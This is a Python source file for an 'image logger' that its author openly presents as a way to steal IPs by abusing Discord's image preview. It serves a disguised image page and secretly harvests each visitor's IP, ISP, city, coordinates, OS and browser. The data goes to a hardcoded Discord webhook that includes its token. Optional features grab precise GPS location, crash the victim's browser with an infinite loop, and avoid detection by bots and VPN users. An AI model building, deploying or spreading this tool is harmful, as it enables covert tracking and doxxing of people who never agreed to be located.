# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1214729086061248574/lIjKTQ61w5AtPtNSlGvMY-LKQIGcE5gnb70LNrAejiFGLVRW_oUQtLmiJ5-9kmBLHWeh",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI
